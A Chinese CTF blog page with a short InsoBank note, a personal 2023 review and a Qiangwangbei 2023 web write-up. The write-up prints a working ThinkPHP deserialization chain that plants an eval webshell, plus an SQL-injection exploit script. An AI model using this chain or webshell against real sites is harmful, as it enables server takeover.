-          <h2 id="InsoBank"><a href="#InsoBank" class="headerlink" title="InsoBank"></a>InsoBank</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">by clZ</span><br><span class="line"></span><br><span class="line">We&#x27;re launching a new online Bank today which is of course backed by crypto and AI which makes it better than any other banking system out there.</span><br><span class="line"></span><br><span class="line">It&#x27;s not fully featured yet as you can only transfer money within your own accounts, but you can already see how superior it is to other systems:</span><br><span class="line"></span><br><span class="line">http://91.92.201.197:3000/</span><br><span class="line"></span><br><span class="line">Source: here</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (accountid,name,balance) in cursor.fetchall():</span><br><span class="line">        if balance &gt; 13.37:</span><br><span class="line">            results[accountid] = &#123;&#x27;name&#x27;: name, &#x27;balance&#x27;: balance, &#x27;flag&#x27;: FLAG&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/02/05/Insomni-hack/image-20240204225812809-1707062535487-1.png" alt="image-20240204225812809"></p>
-<p>python精度问题</p>
-<p><img src="/2024/02/05/Insomni-hack/image-20240204225846640-1707062535488-2.png" alt="image-20240204225846640"></p>
-<p>ok</p>
-
-      
-    </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/01/29/my2023total/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/01/29/my2023total/" class="post-title-link" itemprop="url">My 2023</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-01-29 13:38:57" itemprop="dateCreated datePublished" datetime="2024-01-29T13:38:57+08:00">2024-01-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-05 00:19:33" itemprop="dateModified" datetime="2024-02-05T00:19:33+08:00">2024-02-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Total/" itemprop="url" rel="index"><span itemprop="name">Total</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>emmm，我也想总结一下下（QWQ）我的2023。</p>
-<p><img src="/2024/01/29/my2023total/wps1.png" alt="img"> </p>
-<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>高考完之后，莫名的就像填计算机啦，也不知道为啥。进入学校发现并且接触到小红帽这个组织，其实我超级社恐，经过学长的帮助我成功进入了网络部，vocal，发现这里有超级🐂而且还喜欢帮助我们的学长学姐，也有志同道合的朋友，感觉真是幸福了。然后就开始正式开始前端啦，不知道是因为喜欢还是想努力一点，反正就是经常都学到深夜，然后在学长学姐的推荐↓参加了网页设计大赛，呃呃呃第二名，我有亿点社恐然后还没有准备，答辩的时候，我不知道我们在讲些啥，哈哈哈总归学了那么久还是有点收货啦</p>
-<p><img src="/2024/01/29/my2023total/wps2.png" alt="img"> </p>
-<h2 id="网安"><a href="#网安" class="headerlink" title="网安"></a>网安</h2><p>怎么说呢，也是在学长的帮助下，加上这个东西有点兴趣，就拉着一个挺上进的室友去参加了一个emmm算是小培训吧，vocal在这里又认识了另外一些学长学姐，恰逢网页设计大赛之前，我也恰好遇到一些问题，反正就没听这个培训的内容(后面被举报了d(ŐдŐ๑)，就全去问大佬网页的问题了。</p>
-<p>然后就是国赛的招新赛啦！我只能说是真的有点运气好，叫上我的室友，我们就开始第一次CTF了，怎么说呢，感觉有种有点上瘾的感觉，哈哈哈后来才知道，还是学长很用心的出了适合我们的题目(不然只能当场退役了)，恰好之前学了一点点前端，再加上室友当时听了一些培训的内容，总之我们俩还是成功选上了。到了国赛初赛我才知道，CTF的不同，校内选拔赛全靠学长努力���，我根本不会啊，我记得学长问我这个符号是啥  ^   其实我很懵，我根本不知道啊，我连别人做好的我连脚本都看不懂，但好在学长学姐努力���，我成功进线下赛啦。虽然我们队没有取得好成绩，属于是直接去旅游啦（真的是去旅游的！真的），但是现在才知道，才接触CTF就有这种机会，真的超级幸运了（说不完根本说不完，只能感谢学长们了@kdxcxs，@CH3NQU）…………真的一路全靠带</p>
-<p><img src="/2024/01/29/my2023total/wps3.png" alt="img"> </p>
-<h2 id="遗憾"><a href="#遗憾" class="headerlink" title="遗憾"></a>遗憾</h2><p>好像是暑假的时候，其实当时才国赛回来，emm感觉我啥也不会，很受伤狠狠的质疑了自己。然后有一填参加了一下nepnep的招新赛，其实当时我也不知道是招新赛，只是在nss看见这个比赛了，我就去打了一下下，有些题目感觉真的可能做出来，就去bilibili看了一下赛后讲解（绝对不是为了抽奖qwq），然后发现可以投简历NepNep啊，那么大的战队，感觉离我很远很远，但是感觉挺好奇的之前没有投过简历，我直接Google找到一个模板，浅填了一下基本信息，然后里面啥也没有了。vocal，hr加我了，我有面试的机会，很激动很激动，但是感觉自己真的学的很少很少，就属于是漫无目的的学，知道一些东西但是仅限于知道。然后就跟CH3NQU大哥说了，大哥是真的很好很好，经常帮助我。然后我们聊了很多，也鼓励我冲。反正我啥也没有这种机会也不要钱，那就冲吧，还帮我联系到了贝塔姐（NepNep战队的，vocal深藏不露，我这是又认识一个大佬，我跑去跟贝塔姐也聊了很多，哈哈哈哈谁不喜欢高质量人才呢，我只能再次说我好幸运，贝塔姐也帮我。</p>
-<p>开始面试，vocal我都不知道是几个大佬在轮番拷打我了，这时候我才发现，我是真不会啊，但这也是学习的机会，我知道了自己的很多不足啦，我心里很清楚，没抓住这次机会。还是怪自己之前努力并不够。然后vocal，kdxcxs哥直接一个电话打过来，说帮我复盘这个面试，然后还叫上了贝塔姐。vocal我何德何能啊。总之，真的是很幸运很幸运了，但是自己还是得加油，遗憾就遗憾吧，不能那么多好事都让我占了吧</p>
-<p><img src="/2024/01/29/my2023total/wps4.png" alt="img"> </p>
-<h2 id="幸运"><a href="#幸运" class="headerlink" title="幸运"></a>幸运</h2><p>emm前面都说了那么多幸运了，但是还是想继续说一些其它的，比如遇到超级超级温柔漂亮的女朋友（其他不告诉你）。比如小红帽，这里真是我大学以来开始努力的地方，恰好遇到了很多志同道合的朋友，很多学长学姐都在帮助我们，哈哈哈比如之前说了那么多的CH3NQU大哥，卫老师（怎么说就是🐂，就是好），贺最（怎么说，就是亲民）还有很多很多不是我们部门的人啦，比如秋秋姐，王最，蒋老师他们（说不完根本说不完）。当然，也少不了我们一级的干事了，磊子哥，娅姐，棋总，坤哥，小学同学等等等等等等等，还有其它部门的很多好朋友们。下半年也是继续留着小红帽了，我们又找到了新干事们了，属于都是很牛的，很卷的，总之就是各有所长了。再比如室友们，大家都超级和睦，相处起来非常融洽，属于是在高考完刷抖音刷到寝室问题的时候心里提起的大石头，算是落地了。</p>
-<p>然后就是C0ba1t了，队友们感觉不仅很强，而且都很努力，属于是找到另一个归属了</p>
-<p>然后就是CO啦，这里真的很多大佬了，有很负责的老师，还有很多很多大佬学长，有很多的资源，有非常好的学习氛围。真的非常荣幸能够进入co</p>
-<p>（不行太多了，说不完根本说不完）</p>
-<p>总之就是很幸运啦！</p>
-<p><img src="/2024/01/29/my2023total/wps5.png" alt="img"> </p>
-<h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><p>下半年我们自己打了很多CTF比赛，很多时候都是去坐牢了d(ŐдŐ๑)没办法我太菜了(;´༎ຶД༎ຶ&#96;) ，但是，还是很多很多收货都，比如线下见到暑假网友辉哥，还看见很多其它学校的大佬，最后获得了二等奖，属于是有点不甘心但是有一些意外，但是更多的还是我太菜了d(ŐдŐ๑)。然后然后vocal大佬直接带我们进r3kapig子战队，又属于是幸福了，然后那些比赛就是以另一种奇特的方式坐牢了d(ŐдŐ๑)，开始接触更多的国际赛，很少很少做出题。在notion里面看见大佬的解题思路，真的属于是走进新世界的大门，真的有很努力的复现了，但是有些真的看着思路给了exp我都打不出来，菜的想死，甚至还能把自己电脑文件搞掉，服务器直接被拿下。真服了。</p>
-<p>但是在这途中还是参加了一下其他的比赛，属于是混奖了，王最大哥直接带飞。还有其它的我就只写个网页，就其他的全靠别人的成果了。</p>
-<p><img src="/2024/01/29/my2023total/wps6.png" alt="img"> </p>
-<h2 id="挖洞"><a href="#挖洞" class="headerlink" title="挖洞"></a>挖洞</h2><p>在年末那几天，CH3NQU哥拿下几个学校的漏洞，我之前也试过但是苦于根本找不到在哪，然后就在那几天突然发现一个洞，然后没过几天浅试一下就又找到了。感觉就是挖简单的洞只要有点经验，然后很容易找到的（我想要0day，我想CVE������）</p>
-<p><img src="/2024/01/29/my2023total/wps7.png" alt="img"> </p>
-<p>总之呢，2023有很多很多幸运都事情，也有很多很多烦恼，也不是一些文字螚描述清楚的，emmm，反正还是得继续继续努力，越想自己越菜，加油吧！！！！！冲冲冲！！</p>
-
-      
-    </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/27/qiangwangbei/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/27/qiangwangbei/" class="post-title-link" itemprop="url">强网杯2023</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-12-27 00:26:21" itemprop="dateCreated datePublished" datetime="2023-12-27T00:26:21+08:00">2023-12-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-05 00:31:20" itemprop="dateModified" datetime="2024-02-05T00:31:20+08:00">2024-02-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>给了docker，代码逻辑</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231218230623159-1707064057755-1.png" alt="image-20231218230623159"></p>
-<p>mad，开局这里不是admin</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231219003304097-1707064057755-2.png" alt="image-20231219003304097"></p>
-<p>这个函数有sql注入</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231218230743819-1707064057755-3.png" alt="image-20231218230743819"></p>
-<p>找到逻辑</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231218230846206-1707064057755-4.png" alt="image-20231218230846206"></p>
-<p>继续</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231218230905900-1707064057755-5.png" alt="image-20231218230905900"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&#x27;data&#x27;])))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/27/qiangwangbei/image-20231218231424714-1707064057755-6.png" alt="image-20231218231424714"></p>
-<p>抓包，获取请求数据</p>
-<p>从docker中可以看到，flag不在数据库里面，所以我们需要RCE，emm</p>
-<p>这里有个反序列化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Pipes</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files = [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Relation</span><br><span class="line">&#123;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;query = new Query();#class Query</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line"></span><br><span class="line">abstract class OneToOne extends Relation</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasOne extends OneToOne</span><br><span class="line">&#123;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $this-&gt;bindAttr = [&quot;no&quot;, &quot;123&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line"></span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    private $handle = null;</span><br><span class="line">    protected $styles = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handle = new Memcached();//目的调用其write()</span><br><span class="line">        $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    public $parent;#修改处</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $aaaaa;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;parent = new Output();#Output对象,目的是调用__call()</span><br><span class="line">        $this-&gt;append = [&#x27;getError&#x27;];</span><br><span class="line">        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()</span><br><span class="line">        $this-&gt;selfRelation = false;//isSelfRelation()</span><br><span class="line">        $this-&gt;query = new Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line"></span><br><span class="line">class Query</span><br><span class="line">&#123;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler = new File();//目的调用File-&gt;set()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">#File</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27; =&gt; 0,</span><br><span class="line">            &#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27; =&gt; &#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize([new Windows()]));</span><br></pre></td></tr></table></figure>
-
-<p>直接网上找条链子就打通了</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231218232718457-1707064057755-7.png" alt="image-20231218232718457"></p>
-<p>需要数组形式的</p>
-<p>然后构造一个sql语句</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231218235801197-1707064057755-8.png" alt="image-20231218235801197"></p>
-<p>exp:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://192.168.153.130:36000/public/index.php/index/admin/do_edit.html&#x27;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    &#x27;PHPSESSID&#x27;: &#x27;l98e9omcje3gljtum9ith1ffn6&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exp = &quot;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&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;id&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;name&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;price&#x27;: &#x27;1.00&#x27;,</span><br><span class="line">    &#x27;on_sale_time&#x27;: &#x27;2023-12-16T21:20&#x27;,</span><br><span class="line">    &#x27;image&#x27;: &#x27;$sql&#x27;,</span><br><span class="line">    f&quot;data`=&#x27;&#123;exp&#125;&#x27;/**/WHERE/**/`id`/**/=/**/1;#&quot;: &#x27;123&#x27;,</span><br><span class="line">    &#x27;data&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, cookies=cookies, data=data)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>最后访问页面，触发反序列化</p>
-<p><img src="/2023/12/27/qiangwangbei/image-20231218235942528-1707064057755-9.png" alt="image-20231218235942528"></p>
-<p>本地打一下，看见打上去了</p>
-<p>直接RCE</p>
